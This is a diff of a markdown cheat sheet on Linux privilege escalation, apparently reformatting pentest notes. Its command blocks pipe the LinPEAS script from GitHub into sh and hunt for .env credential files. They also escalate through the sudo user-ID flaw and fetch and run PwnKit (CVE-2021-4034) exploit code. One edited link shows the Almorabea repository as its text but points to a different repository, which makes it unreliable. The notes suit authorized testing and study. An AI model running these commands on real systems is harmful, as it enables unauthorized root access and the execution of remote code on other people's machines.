@@ -1,10 +1,8 @@
-# Linux
+# Linux Privilege Escalation
 
 ## System Enumeration
 
-### LinPEAS
-
-> https://github.com/peass-ng/PEASS-ng
+### [LinPEAS](https://github.com/peass-ng/PEASS-ng)
 
 ```bash
 curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -32,7 +30,9 @@ env || set
 
 ### Common Config Files
 
-> If you want to black list any directory you can add: `-not -path "<PATH>/*"`
+{% hint style="info" %}
+If you want to black list any directory you can add: `-not -path "<PATH>/*"`
+{% endhint %}
 
 ```bash
 find / -type f -name ".env" 2>/dev/null
@@ -65,7 +65,9 @@ ls -l /var/log/cron
 
 ### Process Monitor
 
-> You can add words to the blacklist on the `grep -Ev` section.
+{% hint style="info" %}
+You can add words to the blacklist on the `grep -Ev` section.
+{% endhint %}
 
 ```bash
 old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); \
@@ -97,14 +99,14 @@ sudo -u#-1 /bin/bash
 
 ### PwnKit - (CVE-2021-4034)
 
-> https://github.com/Almorabea/pkexec-exploit/tree/main
+[https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
 
 ```bash
 curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py \
 -o PwnKit.py && python3 PwnKit.py
 ```
 
-> https://github.com/ly4k/PwnKit/tree/main
+[https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
 
 ```bash
 curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
